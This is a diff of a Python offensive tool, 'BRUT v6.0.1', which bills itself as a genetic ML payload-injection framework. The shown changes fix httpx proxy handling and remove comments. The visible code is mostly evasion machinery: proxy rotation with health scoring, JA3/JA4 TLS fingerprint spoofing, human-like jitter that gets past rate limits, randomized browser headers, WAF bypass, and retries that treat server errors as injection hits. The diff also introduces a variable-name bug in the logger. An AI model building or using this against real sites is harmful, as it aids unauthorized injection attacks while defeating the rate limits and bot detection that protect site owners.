@@ -1,16 +1,11 @@
 #!/usr/bin/env python3
 """
-BRUT v6.0 — Genetic ML Payload Injection + Anti-Rate-Limit Framework
-====================================================================
-ALL v5.0 features preserved + NEW:
-- Proxy Pool Manager with Automatic Circuit Breaker
-- TLS Fingerprint Spoofing (JA3/JA4 Evasion via curl_cffi)
-- Adaptive Throttling & Jitter (Human-Like Delay)
-- Tenacity Retry Engine (smart retry on 429/403/timeout)
-- IP Health Scoring & Blacklisting
-- Request Pacing with Exponential Backoff
-- Connection Pool Rotation
-- Anti-Detection Header Randomization
+BRUT v6.0.1 — Genetic ML Payload Injection + Anti-Rate-Limit Framework
+=======================================================================
+ALL v5.0 + v6.0 features preserved + FIX:
+- httpx 0.28+ compatibility (proxies → proxy parameter)
+- Version-aware proxy argument builder
+- Ultimate fallback for any httpx version
 """
 
 import os
@@ -86,7 +81,7 @@ def get_status_meaning(code: int) -> str:
 
 
 # ============================================================
-# DEPENDENCY MANAGEMENT (v6.0 — added curl_cffi, tenacity)
+# DEPENDENCY MANAGEMENT (v6.0.1 — added curl_cffi, tenacity)
 # ============================================================
 REQUIRED_DEPS = [
     ("numpy", "numpy", "Numerical computing", False),
@@ -109,7 +104,7 @@ REQUIRED_DEPS = [
 
 def install_dependencies():
     print("\n\033[36m" + "=" * 60)
-    print("  BRUT v6.0: Dependency Manager")
+    print("  BRUT v6.0.1: Dependency Manager")
     print("=" * 60 + "\033[0m\n")
 
     missing = []
@@ -264,7 +259,7 @@ except ImportError:
 
 
 # ============================================================
-# BANNER v6.0
+# BANNER v6.0.1
 # ============================================================
 def print_banner():
     banner = f"""
@@ -275,7 +270,7 @@ def print_banner():
 /_____/_/   \\__,_/\\__/\\___/_/   /_____/
 \033[0m                                       
 \033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
-\033[1;37m      BRUT v6.0 — Anti-Rate-Limit Genetic ML Framework\033[0m
+\033[1;37m      BRUT v6.0.1 — Anti-Rate-Limit Genetic ML Framework\033[0m
 \033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
 
 \033[36m    ┌─────────────────────────────────────────────────────────────┐\033[0m
@@ -297,13 +292,14 @@ def print_banner():
 \033[36m    │\033[0m  \033[32m●\033[0m Detailed Logger      (payload+snippet+status+time)     \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save     (TXT + JSON + Evolution Log)      \033[36m│\033[0m
 \033[36m    ├─────────────────────────────────────────────────────────────┤\033[0m
-\033[36m    │\033[0m  \033[1;35m★ v6.0 ANTI-RATE-LIMIT ENGINE\033[0m                             \033[36m│\033[0m
+\033[36m    │\033[0m  \033[1;35m★ v6.0.1 ANTI-RATE-LIMIT ENGINE\033[0m                           \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Proxy Pool Manager   (circuit breaker+health scoring)  \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m TLS Fingerprint      (JA3/JA4 evasion via curl_cffi)   \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Adaptive Throttling  (human-like jitter+backoff)       \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Tenacity Retry       (smart retry on 429/403/timeout)  \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m IP Health Scoring    (blacklist bad proxies auto)      \033[36m│\033[0m
 \033[36m    │\033[0m  \033[32m●\033[0m Connection Rotation  (pool cycling+cooldown)           \033[36m│\033[0m
+\033[36m    │\033[0m  \033[32m●\033[0m httpx Compat Fix     (auto proxy/proxies detection)    \033[36m│\033[0m
 \033[36m    └─────────────────────────────────────────────────────────────┘\033[0m
 
 \033[1;35m    Mode    :\033[0m Interactive  |  \033[1;35mSpecial:\033[0m /exit, max
@@ -316,7 +312,7 @@ def print_banner():
 
 
 # ============================================================
-# PROXY POOL MANAGER (v6.0 NEW — Circuit Breaker + Health)
+# PROXY POOL MANAGER (v6.0 — Circuit Breaker + Health)
 # ============================================================
 @dataclass
 class ProxyInfo:
@@ -347,7 +343,6 @@ class ProxyPoolManager:
     - Cooldown period before retrying failed proxies
     """
 
-    # Default free/public proxy templates (user should supply their own)
     DEFAULT_PROXIES = []
 
     def __init__(self, proxy_list: List[str] = None, cooldown_seconds: float = 30.0,
@@ -357,33 +352,28 @@ class ProxyPoolManager:
         self.max_failures = max_failures
         self.blacklist_threshold = blacklist_threshold
         self.current_index = 0
-        self.direct_mode = False  # True = no proxy, direct connection
+        self.direct_mode = False
         self.lock = threading.Lock()
         self.rotation_count = 0
         self.total_rotations = 0
 
-        # Initialize proxies
         if proxy_list:
             for p in proxy_list:
                 self.add_proxy(p)
         else:
-            # Start in direct mode (no proxy)
             self.direct_mode = True
             self._add_direct()
 
     def _add_direct(self):
-        """Add direct connection as a 'proxy' entry."""
         self.proxies["DIRECT"] = ProxyInfo(
             url="DIRECT", protocol="direct",
             health_score=1.0
         )
 
     def add_proxy(self, proxy_url: str):
-        """Add a proxy to the pool."""
         clean = proxy_url.strip()
         if not clean:
             return
-        # Detect protocol
         if clean.startswith("socks5"):
             proto = "socks5"
         elif clean.startswith("socks4"):
@@ -399,7 +389,6 @@ class ProxyPoolManager:
         self.direct_mode = False
 
     def load_proxies_from_file(self, filepath: str):
-        """Load proxies from a text file (one per line)."""
         if not os.path.exists(filepath):
             print(f"  \033[33m[!]\033[0m Proxy file not found: {filepath}")
             return 0
@@ -416,10 +405,6 @@ class ProxyPoolManager:
         return count
 
     def get_next_proxy(self) -> Optional[ProxyInfo]:
-        """
-        Get the next healthy proxy using round-robin with health check.
-        Returns None if all proxies are unhealthy (falls back to direct).
-        """
         with self.lock:
             now = time.time()
             available = []
@@ -435,18 +420,15 @@ class ProxyPoolManager:
                 available.append(proxy)
 
             if not available:
-                # All proxies failed — reset cooldowns and try again
                 self._reset_all_cooldowns()
                 available = [p for p in self.proxies.values()
                            if not p.is_blacklisted]
 
             if not available:
-                # Everything blacklisted — force direct mode
                 if "DIRECT" not in self.proxies:
                     self._add_direct()
                 return self.proxies["DIRECT"]
 
-            # Pick best by health score (weighted random)
             weights = [max(0.1, p.health_score) for p in available]
             total_w = sum(weights)
             r = random.uniform(0, total_w)
@@ -463,7 +445,6 @@ class ProxyPoolManager:
             return chosen
 
     def get_proxy_dict(self, proxy: ProxyInfo = None) -> Optional[Dict]:
-        """Convert ProxyInfo to requests-compatible proxy dict."""
         if proxy is None:
             proxy = self.get_next_proxy()
         if proxy is None or proxy.url == "DIRECT":
@@ -474,21 +455,16 @@ class ProxyPoolManager:
         }
 
     def record_success(self, proxy: ProxyInfo, response_time: float = 0):
-        """Record a successful request through this proxy."""
         with self.lock:
             proxy.success_count += 1
             total = proxy.success_count + proxy.failure_count
             proxy.health_score = min(1.0, proxy.success_count / max(1, total))
             if response_time > 0:
                 proxy.response_times.append(response_time)
-                # Keep only last 50
                 if len(proxy.response_times) > 50:
                     proxy.response_times = proxy.response_times[-50:]
 
     def record_failure(self, proxy: ProxyInfo, status_code: int = 0):
-        """
-        Record a failed request. Triggers circuit breaker if threshold reached.
-        """
         with self.lock:
             proxy.failure_count += 1
             proxy.last_failure = time.time()
@@ -498,22 +474,19 @@ class ProxyPoolManager:
             if status_code > 0:
                 proxy.blocked_statuses.append(status_code)
 
-            # Circuit breaker: too many failures
             if proxy.failure_count >= self.max_failures:
                 if proxy.health_score < self.blacklist_threshold:
                     proxy.is_blacklisted = True
                     print(f"  \033[31m[CIRCUIT BREAKER]\033[0m Proxy blacklisted: "
                           f"{proxy.url[:40]}... (health={proxy.health_score:.2f})")
                 else:
-                    # Cooldown instead of blacklist
                     proxy.cooldown_until = time.time() + self.cooldown_seconds
                     print(f"  \033[33m[COOLDOWN]\033[0m Proxy cooling down: "
                           f"{proxy.url[:40]}... ({self.cooldown_seconds}s)")
 
     def record_rate_limited(self, proxy: ProxyInfo):
-        """Special handling for 429 — immediate rotation."""
         with self.lock:
-            proxy.failure_count += 2  # Heavier penalty
+            proxy.failure_count += 2
             proxy.last_failure = time.time()
             proxy.cooldown_until = time.time() + (self.cooldown_seconds * 2)
             total = proxy.success_count + proxy.failure_count
@@ -522,15 +495,12 @@ class ProxyPoolManager:
                   f"{proxy.url[:40]}... → cooldown {self.cooldown_seconds*2:.0f}s")
 
     def _reset_all_cooldowns(self):
-        """Reset all cooldowns (emergency reset when all proxies are down)."""
         now = time.time()
         for proxy in self.proxies.values():
             proxy.cooldown_until = 0
-            # Partially restore health
             proxy.health_score = max(proxy.health_score, 0.3)
 
     def get_pool_stats(self) -> Dict:
-        """Get proxy pool statistics."""
         total = len(self.proxies)
         healthy = sum(1 for p in self.proxies.values()
                      if not p.is_blacklisted and p.health_score > 0.3)
@@ -560,20 +530,9 @@ class ProxyPoolManager:
 
 
 # ============================================================
-# TLS FINGERPRINT ENGINE (v6.0 NEW — JA3/JA4 Evasion)
+# TLS FINGERPRINT ENGINE (v6.0 — JA3/JA4 Evasion)
 # ============================================================
 class TLSFingerprintEngine:
-    """
-    Uses curl_cffi to spoof TLS fingerprints (JA3/JA4) of real browsers.
-    This prevents WAF from detecting the client as a bot based on TLS handshake.
-
-    Supported impersonation targets:
-    - chrome (latest Chrome)
-    - firefox (latest Firefox)
-    - safari (latest Safari)
-    - edge (latest Edge)
-    """
-
     IMPERSONATION_TARGETS = [
         "chrome120", "chrome119", "chrome116", "chrome110",
         "chrome107", "chrome104", "chrome101", "chrome99",
@@ -586,13 +545,9 @@ class TLSFingerprintEngine:
         self.current_target = "chrome120"
         self.rotation_index = 0
         self.request_count = 0
-        self.rotation_interval = 10  # Rotate TLS fingerprint every N requests
+        self.rotation_interval = 10
 
     def get_session(self, proxy_dict: Dict = None) -> Any:
-        """
-        Create a curl_cffi session with browser impersonation.
-        Returns a curl_cffi.requests.Session object.
-        """
         if not HAS_CURL_CFFI:
             return None
 
@@ -603,7 +558,6 @@ class TLSFingerprintEngine:
         try:
             proxies = None
             if proxy_dict:
-                # curl_cffi expects proxy as string
                 for v in proxy_dict.values():
                     proxies = {"https": v, "http": v}
                     break
@@ -616,7 +570,6 @@ class TLSFingerprintEngine:
             )
             return session
         except Exception as e:
-            # Fallback to a simpler target
             try:
                 session = curl_requests.Session(
                     impersonate="chrome110",
@@ -628,7 +581,6 @@ class TLSFingerprintEngine:
                 return None
 
     def _rotate_target(self):
-        """Rotate to next TLS fingerprint target."""
         self.rotation_index = (self.rotation_index + 1) % len(self.IMPERSONATION_TARGETS)
         self.current_target = self.IMPERSONATION_TARGETS[self.rotation_index]
 
@@ -636,10 +588,6 @@ class TLSFingerprintEngine:
                     params: Dict = None, data: Dict = None,
                     headers: Dict = None, proxy_dict: Dict = None,
                     timeout: float = 30.0) -> Tuple[Optional[str], int, float, int]:
-        """
-        Make HTTP request with TLS fingerprint spoofing.
-        Returns: (response_text, status_code, response_time_ms, response_size)
-        """
         if not HAS_CURL_CFFI:
             return None, 0, 0, 0
 
@@ -674,17 +622,9 @@ class TLSFingerprintEngine:
 
 
 # ============================================================
-# ADAPTIVE THROTTLER (v6.0 NEW — Human-Like Delay + Backoff)
+# ADAPTIVE THROTTLER (v6.0 — Human-Like Delay + Backoff)
 # ============================================================
 class AdaptiveThrottler:
-    """
-    Implements human-like request pacing:
-    - Randomized jitter between requests
-    - Exponential backoff on 429/403
-    - Adaptive speed based on server responses
-    - Burst detection prevention
-    """
-
     def __init__(self, min_delay: float = 0.3, max_delay: float = 2.5,
                  burst_limit: int = 15, burst_window: float = 10.0):
         self.min_delay = min_delay
@@ -697,16 +637,12 @@ class AdaptiveThrottler:
         self.consecutive_success = 0
         self.total_throttle_time = 0.0
         self.backoff_multiplier = 1.0
-        self.max_backoff = 30.0  # Maximum backoff in seconds
+        self.max_backoff = 30.0
         self.is_backing_off = False
 
     def wait(self):
-        """
-        Wait before sending next request. Applies jitter and backoff.
-        """
         now = time.time()
 
-        # Burst detection: if too many requests in window, force delay
         recent = [t for t in self.request_timestamps
                  if now - t < self.burst_window]
         if len(recent) >= self.burst_limit:
@@ -717,53 +653,42 @@ class AdaptiveThrottler:
                 time.sleep(force_delay)
                 self.total_throttle_time += force_delay
 
-        # Calculate delay with jitter
         if self.is_backing_off:
             delay = self.current_delay * self.backoff_multiplier
-            # Add random jitter (±30%)
             jitter = delay * random.uniform(-0.3, 0.3)
             delay = max(self.min_delay, delay + jitter)
         else:
-            # Normal human-like jitter
             delay = random.uniform(self.min_delay, self.max_delay)
-            # Occasionally add longer pauses (like human thinking)
             if random.random() < 0.1:
                 delay += random.uniform(1.0, 4.0)
 
-        # Cap at max backoff
         delay = min(delay, self.max_backoff)
 
         time.sleep(delay)
         self.total_throttle_time += delay
         self.request_timestamps.append(time.time())
 
-        # Clean old timestamps
         cutoff = time.time() - 60
         self.request_timestamps = [t for t in self.request_timestamps if t > cutoff]
 
     def record_success(self):
-        """Record a successful (non-rate-limited) response."""
         self.consecutive_success += 1
         self.consecutive_429 = 0
 
-        # Gradually reduce delay if many successes
         if self.consecutive_success > 10:
             self.current_delay = max(self.min_delay, self.current_delay * 0.95)
             self.backoff_multiplier = max(1.0, self.backoff_multiplier * 0.9)
 
-        # Exit backoff mode after enough successes
         if self.consecutive_success > 5 and self.is_backing_off:
             self.is_backing_off = False
             self.backoff_multiplier = 1.0
             print(f"  \033[32m[THROTTLE]\033[0m Backoff cleared, resuming normal pace")
 
     def record_rate_limited(self, status_code: int = 429):
-        """Record a rate-limited response. Triggers exponential backoff."""
         self.consecutive_429 += 1
         self.consecutive_success = 0
         self.is_backing_off = True
 
-        # Exponential backoff: 2^consecutive_429 seconds
         self.backoff_multiplier = min(
             self.max_backoff,
             2.0 ** self.consecutive_429
@@ -774,13 +699,11 @@ class AdaptiveThrottler:
         print(f"  \033[1;31m[THROTTLE]\033[0m Rate limited ({status_code})! "
               f"Backoff: {backoff_time:.1f}s (attempt #{self.consecutive_429})")
 
-        # Extra long sleep for rate limiting
         actual_sleep = backoff_time + random.uniform(1.0, 3.0)
         time.sleep(actual_sleep)
         self.total_throttle_time += actual_sleep
 
     def record_blocked(self, status_code: int = 403):
-        """Record a blocked response (WAF). Moderate backoff."""
         self.is_backing_off = True
         self.backoff_multiplier = min(self.max_backoff,
                                       self.backoff_multiplier * 1.5)
@@ -813,21 +736,13 @@ class AdaptiveThrottler:
 
 
 # ============================================================
-# RETRY ENGINE (v6.0 NEW — Tenacity-Based Smart Retry)
+# RETRY ENGINE (v6.0 — Tenacity-Based Smart Retry)
 # ============================================================
 class RetryEngine:
-    """
-    Uses tenacity for smart retry logic:
-    - Exponential backoff with jitter
-    - Retry on specific status codes (429, 403, 500, 502, 503, 504)
-    - Retry on connection errors
-    - Maximum retry attempts per request
-    """
-
     RETRYABLE_STATUS_CODES = {429, 403, 408, 500, 502, 503, 504, 520, 521, 522, 523}
     MAX_RETRIES = 4
-    BASE_WAIT = 2     # seconds
-    MAX_WAIT = 30     # seconds
+    BASE_WAIT = 2
+    MAX_WAIT = 30
 
     def __init__(self, throttler: AdaptiveThrottler,
                  proxy_manager: ProxyPoolManager,
@@ -839,22 +754,15 @@ class RetryEngine:
         self.total_retries = 0
 
     def execute_with_retry(self, request_func, *args, **kwargs):
-        """
-        Execute a request function with automatic retry.
-        request_func should return (text, status_code, time_ms, size).
-        """
         last_result = (None, 0, 0, 0)
         current_proxy = None
 
         for attempt in range(self.MAX_RETRIES + 1):
-            # Get proxy for this attempt
             current_proxy = self.proxy_manager.get_next_proxy()
             proxy_dict = self.proxy_manager.get_proxy_dict(current_proxy)
 
             try:
-                # Throttle before request
                 if attempt > 0:
-                    # Extra delay on retries
                     retry_delay = min(self.MAX_WAIT,
                                      self.BASE_WAIT * (2 ** attempt) +
                                      random.uniform(0.5, 2.0))
@@ -866,7 +774,6 @@ class RetryEngine:
                 else:
                     self.throttler.wait()
 
-                # Execute the request
                 kwargs_with_proxy = {**kwargs, "proxy_dict": proxy_dict}
                 result = request_func(*args, **kwargs_with_proxy)
 
@@ -875,46 +782,38 @@ class RetryEngine:
 
                 text, status, elapsed, size = result
 
-                # Handle rate limiting
                 if status == 429:
                     self.throttler.record_rate_limited(429)
                     self.proxy_manager.record_rate_limited(current_proxy)
                     last_result = result
-                    continue  # Retry
+                    continue
 
-                # Handle WAF block
                 if status == 403:
                     self.throttler.record_blocked(403)
                     self.proxy_manager.record_failure(current_proxy, 403)
                     last_result = result
                     if attempt < self.MAX_RETRIES:
-                        continue  # Retry with different proxy
+                        continue
                     break
 
-                # Handle server errors (might be injection success!)
                 if status in [500, 502, 503, 504]:
                     self.proxy_manager.record_failure(current_proxy, status)
-                    # Don't retry server errors — they might be injection results
                     self.proxy_manager.record_success(current_proxy, elapsed)
                     self.throttler.record_success()
                     return result
 
-                # Handle success
                 if status in range(200, 400):
                     self.proxy_manager.record_success(current_proxy, elapsed)
                     self.throttler.record_success()
                     return result
 
-                # Handle other errors
                 if status == 0:
-                    # Connection failed
                     self.proxy_manager.record_failure(current_proxy, 0)
                     last_result = result
                     if attempt < self.MAX_RETRIES:
                         continue
                     break
 
-                # Other status codes
                 self.proxy_manager.record_success(current_proxy, elapsed)
                 self.throttler.record_success()
                 return result
@@ -937,7 +836,46 @@ class RetryEngine:
 
 
 # ============================================================
-# STEALTH HTTP CLIENT (Enhanced v6.0)
+# HTTPX VERSION COMPATIBILITY HELPER (v6.0.1 FIX)
+# ============================================================
+def _httpx_version_info() -> tuple:
+    """Detect httpx version and return (major, minor, patch) tuple."""
+    try:
+        ver = tuple(int(x) for x in httpx.__version__.split(".")[:3])
+        return ver
+    except:
+        return (0, 0, 0)
+
+
+def _build_httpx_proxy_arg(proxy_dict: dict = None) -> dict:
+    """
+    Build the correct proxy argument for the installed httpx version.
+    - httpx < 0.28: uses 'proxies' (dict) parameter
+    - httpx >= 0.28: uses 'proxy' (string) parameter
+    Returns: dict for **kwargs unpacking, or {} if no proxy.
+    """
+    if not proxy_dict:
+        return {}
+
+    ver = _httpx_version_info()
+
+    if ver >= (0, 28, 0):
+        # httpx 0.28+ : proxy (singular, string)
+        proxy_url = None
+        for v in proxy_dict.values():
+            if v:
+                proxy_url = v
+                break
+        if proxy_url:
+            return {"proxy": proxy_url}
+        return {}
+    else:
+        # httpx < 0.28 : proxies (plural, dict)
+        return {"proxies": proxy_dict}
+
+
+# ============================================================
+# STEALTH HTTP CLIENT (Enhanced v6.0.1 — httpx compat fix)
 # ============================================================
 STEALTH_HEADERS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -981,7 +919,6 @@ def get_stealth_headers() -> Dict[str, str]:
         "DNT": random.choice(["1", "0"]),
     }
 
-    # Randomly add extra headers to look more human
     if random.random() < 0.3:
         headers["Referer"] = random.choice([
             "https://www.google.com/",
@@ -1000,24 +937,43 @@ def get_stealth_headers() -> Dict[str, str]:
 
 
 def get_stealth_client(proxy_dict: Dict = None):
+    """
+    v6.0.1: Fixed httpx compatibility — handles both proxies (old) and proxy (new).
+    """
     if not HAS_HTTPX:
         return None
     headers = get_stealth_headers()
-    proxies = proxy_dict if proxy_dict else None
+
+    # Build correct proxy argument based on httpx version
+    proxy_kwargs = _build_httpx_proxy_arg(proxy_dict)
+
     if HAS_H2:
         try:
             return httpx.Client(
                 headers=headers, follow_redirects=True, timeout=30.0,
-                verify=False, http2=True, proxies=proxies,
+                verify=False, http2=True,
+                **proxy_kwargs,
                 limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
             )
         except (ImportError, Exception):
             pass
-    return httpx.Client(
-        headers=headers, follow_redirects=True, timeout=30.0,
-        verify=False, http2=False, proxies=proxies,
-        limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
-    )
+    try:
+        return httpx.Client(
+            headers=headers, follow_redirects=True, timeout=30.0,
+            verify=False, http2=False,
+            **proxy_kwargs,
+            limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
+        )
+    except Exception:
+        # Ultimate fallback: no proxy, no http2
+        try:
+            return httpx.Client(
+                headers=headers, follow_redirects=True, timeout=30.0,
+                verify=False, http2=False,
+                limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
+            )
+        except Exception:
+            return None
 
 
 # ============================================================
@@ -1082,9 +1038,9 @@ class EvolutionRecord:
     feedback_loop: Dict[str, Any] = field(default_factory=dict)
     fitness_score: float = 0.0
     is_alive: bool = True
-    proxy_used: str = ""         # v6.0: track which proxy was used
-    tls_fingerprint: str = ""    # v6.0: track TLS fingerprint used
-    throttle_delay: float = 0.0  # v6.0: track throttle delay
+    proxy_used: str = ""
+    tls_fingerprint: str = ""
+    throttle_delay: float = 0.0
 
     def to_dict(self):
         return asdict(self)
@@ -1098,7 +1054,6 @@ class EvolutionSchema:
         self.successful_chains: List[Dict] = []
         self.mutation_blacklist_count: Dict[str, int] = defaultdict(int)
         self.encoding_blacklist_count: Dict[str, int] = defaultdict(int)
-        # v6.0: track rate limit events
         self.rate_limit_events: List[Dict] = []
 
     def create_record(self, payload_dict: Dict, parent_id: str = "",
@@ -1132,7 +1087,6 @@ class EvolutionSchema:
             return
         record = self.records[gen_id]
 
-        # v6.0: store proxy/tls info
         record.proxy_used = proxy_used
         record.tls_fingerprint = tls_fp
         record.throttle_delay = throttle_delay
@@ -1165,7 +1119,6 @@ class EvolutionSchema:
                 if self.mutation_blacklist_count[mut] >= 3:
                     self.blocked_mutations.add(mut)
 
-        # v6.0: track rate limit events
         if status_code == 429:
             self.rate_limit_events.append({
                 "gen_id": gen_id,
@@ -1978,7 +1931,7 @@ class GeneticEvolver:
 
 
 # ============================================================
-# PARAMETER DISCOVERY (preserved from v5.0 — unchanged)
+# PARAMETER DISCOVERY (preserved from v5.0)
 # ============================================================
 @dataclass
 class Parameter:
@@ -2404,7 +2357,6 @@ class FeedbackLearner:
         self.mutation_fail_count = defaultdict(int)
         self.blocked_encodings = set()
         self.encoding_fail_count = defaultdict(int)
-        # v6.0: rate limit tracking
         self.rate_limit_count = 0
         self.last_rate_limit_time = 0
 
@@ -2423,7 +2375,6 @@ class FeedbackLearner:
             if len(self.response_times) >= 10:
                 self.baseline_response_time = sum(self.response_times[-50:]) / len(self.response_times[-50:])
 
-        # v6.0: Track rate limiting
         if status == 429:
             self.rate_limit_count += 1
             self.last_rate_limit_time = time.time()
@@ -3115,10 +3066,10 @@ class InjectionResult:
     anomaly_score: float
     injection_context: str
     generation_id: str
-    proxy_used: str           # v6.0
-    tls_fingerprint: str      # v6.0
-    throttle_delay_ms: float  # v6.0
-    retry_count: int          # v6.0
+    proxy_used: str
+    tls_fingerprint: str
+    throttle_delay_ms: float
+    retry_count: int
     timestamp: str
 
     def to_dict(self): return asdict(self)
@@ -3212,7 +3163,7 @@ class ResponseAnalyzer:
 
 
 # ============================================================
-# INJECTOR v6.0 (Enhanced with Proxy + TLS + Throttle + Retry)
+# INJECTOR v6.0.1 (Enhanced with Proxy + TLS + Throttle + Retry + httpx fix)
 # ============================================================
 class Injector:
     def __init__(self, target, proxy_manager: ProxyPoolManager = None,
@@ -3229,7 +3180,6 @@ class Injector:
         self.analyzer = ResponseAnalyzer()
         self.waf_bypass = WAFBypassEngine()
         self.browser = None
-        # v6.0: tracking
         self.last_proxy_used = None
         self.last_tls_fp = ""
         self.last_throttle_delay = 0.0
@@ -3252,8 +3202,8 @@ class Injector:
                           proxy_dict: Dict = None,
                           extra_headers: Dict = None) -> Tuple[Optional[str], int, float, int]:
         """
-        v6.0: Make HTTP request with TLS fingerprint spoofing priority,
-        then fallback to httpx, then requests.
+        v6.0.1: Make HTTP request with TLS fingerprint spoofing priority,
+        then fallback to httpx (with version-aware proxy arg), then requests.
         """
         headers = get_stealth_headers()
         if extra_headers:
@@ -3269,22 +3219,43 @@ class Injector:
                 self.last_tls_fp = self.tls_engine.get_current_fingerprint()
                 return result
 
-        # Priority 2: httpx with HTTP/2
+        # Priority 2: httpx with HTTP/2 (v6.0.1 — httpx compat fix)
         if HAS_HTTPX:
             start = time.time()
             try:
-                client = get_stealth_client(proxy_dict)
-                if client:
+                proxy_kwargs = _build_httpx_proxy_arg(proxy_dict)
+                client = httpx.Client(
+                    headers=headers, follow_redirects=True, timeout=20.0,
+                    verify=False, http2=HAS_H2,
+                    **proxy_kwargs,
+                    limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
+                )
+                if method == "GET":
+                    resp = client.get(url, params=params, headers=headers, timeout=20)
+                else:
+                    resp = client.post(url, data=data, headers=headers, timeout=20)
+                elapsed = (time.time() - start) * 1000
+                client.close()
+                self.last_tls_fp = "httpx"
+                return resp.text, resp.status_code, elapsed, len(resp.content)
+            except Exception:
+                # Fallback: try without proxy
+                try:
+                    client = httpx.Client(
+                        headers=headers, follow_redirects=True, timeout=20.0,
+                        verify=False, http2=False,
+                        limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
+                    )
                     if method == "GET":
                         resp = client.get(url, params=params, headers=headers, timeout=20)
                     else:
                         resp = client.post(url, data=data, headers=headers, timeout=20)
                     elapsed = (time.time() - start) * 1000
                     client.close()
-                    self.last_tls_fp = "httpx"
+                    self.last_tls_fp = "httpx-noproxy"
                     return resp.text, resp.status_code, elapsed, len(resp.content)
-            except:
-                pass
+                except Exception:
+                    pass
 
         # Priority 3: requests (fallback)
         if HAS_REQUESTS:
@@ -3309,7 +3280,6 @@ class Injector:
         gen_id = payload_dict.get("generation_id", "")
 
         try:
-            # v6.0: Use retry engine for all requests
             proxy_info = self.proxy_manager.get_next_proxy()
             proxy_dict = self.proxy_manager.get_proxy_dict(proxy_info)
             self.last_proxy_used = proxy_info
@@ -3317,7 +3287,6 @@ class Injector:
             if use_browser and param.location == "form_input":
                 rt, st, rpt, rsz = self._inject_browser(param, payload)
             else:
-                # Use retry engine
                 def request_func(url, method, params, data, proxy_dict=None, **kwargs):
                     return self._make_http_request(
                         url, method=method, params=params, data=data,
@@ -3348,7 +3317,6 @@ class Injector:
                 rt or "", st, elapsed
             )
 
-            # v6.0: Handle rate limiting in analyzer
             if st == 429:
                 resp_type = "blocked"
                 evidence = "429 Too Many Requests (Rate Limited)"
@@ -3358,7 +3326,6 @@ class Injector:
                 detector = ContextDetector()
                 ctx = detector.detect_context(rt, param.name, param.original_value or "1")
 
-            # v6.0: Track throttle delay
             throttle_stats = self.throttler.get_stats()
             self.last_throttle_delay = float(
                 throttle_stats.get("current_delay", "0").replace("s", "")
@@ -3452,7 +3419,7 @@ class ReportSaver:
         blocked = [r for r in results if r.response_type == "blocked"]
 
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"{'='*80}\n  BRUT v6.0 — Anti-Rate-Limit Genetic ML Report\n")
+            f.write(f"{'='*80}\n  BRUT v6.0.1 — Anti-Rate-Limit Genetic ML Report\n")
             f.write(f"  Target: {self.target}\n")
             f.write(f"  Date: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"  Total: {len(results)} payloads tested\n")
@@ -3513,7 +3480,7 @@ class ReportSaver:
                     "genetic": evolver.get_generation_summary() if evolver else "",
                     "proxy_stats": proxy_manager.get_pool_stats() if proxy_manager else {},
                     "throttle_stats": throttler.get_stats() if throttler else {},
-                    "version": "6.0",
+                    "version": "6.0.1",
                 },
                 "server_response": [r.to_dict() for r in server],
                 "raw_html": [r.to_dict() for r in raw],
@@ -3560,7 +3527,6 @@ class DetailedLogger:
         if len(result.payload) > 80: payload_display += "..."
         snippet = result.response_snippet[:60].replace('\n', ' ').replace('\r', '')
 
-        # v6.0: Show proxy and TLS info
         proxy_short = result.proxy_used[:25] if result.proxy_used else "DIRECT"
         tls_short = result.tls_fingerprint[:15] if result.tls_fingerprint else "N/A"
 
@@ -3578,13 +3544,13 @@ class DetailedLogger:
               f"\033[90mTLS: \033[0m{tls_short}")
         if result.success:
             print(f"         \033[1;32m⚡ Evidence: {result.evidence}\033[0m")
-            print(f"         \033[1;36m📍 Context: {result.injection_context} | "
+            print(f"         \033[1;36m📍 Context: {r.injection_context} | "
                   f"Anomaly: {result.anomaly_score:.1f}\033[0m")
             print()
 
 
 # ============================================================
-# MAIN PIPELINE v6.0
+# MAIN PIPELINE v6.0.1
 # ============================================================
 class BRUTPipeline:
     def __init__(self, target, proxy_file: str = None):
@@ -3593,14 +3559,12 @@ class BRUTPipeline:
         self.payloads: List[Dict] = []
         self.results: List[InjectionResult] = []
 
-        # v6.0: Initialize anti-rate-limit engines
         self.proxy_manager = ProxyPoolManager()
         if proxy_file:
             self.proxy_manager.load_proxies_from_file(proxy_file)
         self.tls_engine = TLSFingerprintEngine()
         self.throttler = AdaptiveThrottler()
 
-        # Existing engines
         self.learner = FeedbackLearner()
         self.schema = EvolutionSchema()
         self.grammar = GrammarValidator()
@@ -3617,7 +3581,6 @@ class BRUTPipeline:
             self.schema, self.grammar, self.encoder, self.waf_bypass
         )
 
-        # v6.0: Retry engine
         self.retry_engine = RetryEngine(
             self.throttler, self.proxy_manager, self.tls_engine
         )
@@ -3658,7 +3621,6 @@ class BRUTPipeline:
         print(f"    Total: {total} | Mode: {'MAX' if max_mode else 'NORMAL'}")
         print(f"    Genetic: Active | Grammar: Validated | Encoding: {self.encoder.get_rotation_summary()}")
 
-        # v6.0: Show anti-rate-limit status
         proxy_stats = self.proxy_manager.get_pool_stats()
         tls_fp = self.tls_engine.get_current_fingerprint()
         print(f"    Proxy: {proxy_stats['total']} proxies ({proxy_stats['healthy']} healthy) | "
@@ -3701,7 +3663,6 @@ class BRUTPipeline:
 
                     self.logger.log_result(tested, total, result)
 
-                    # v6.0: Track rate limiting
                     if result.status_code == 429:
                         rate_limit_count += 1
                         if rate_limit_count % 5 == 0:
@@ -3716,7 +3677,6 @@ class BRUTPipeline:
